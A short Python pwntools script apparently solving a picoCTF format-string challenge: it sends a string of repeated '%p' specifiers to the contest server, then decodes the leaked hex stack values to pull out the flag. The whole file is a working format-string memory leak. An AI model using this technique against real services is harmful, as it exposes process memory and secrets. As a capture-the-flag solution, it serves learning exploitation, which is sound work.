from pwn import *

address = 'mimas.picoctf.net'
port = 62325

payload = b'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%'
output = ''


with remote(address, port) as target:
        target.recvuntil(b'Give me your order and I\'ll read it back to you:\n')
        target.sendline(payload)
        target.recvuntil(b'Here\'s your order: ')
        output += target.recv(2048).decode()



strings = output.split('0x')

decodedStrings = []

for string in strings:
        newString = ''
        for i in range(0, len(string), 2):
                try:
                        newString += chr(int(string[i:i+2], 16))
                except Exception:
                        pass
        decodedStrings.append(newString[::-1])

strings = ''.join(decodedStrings)
flag = strings[strings.index('pico'):strings.index('}') + 1]
print(flag)
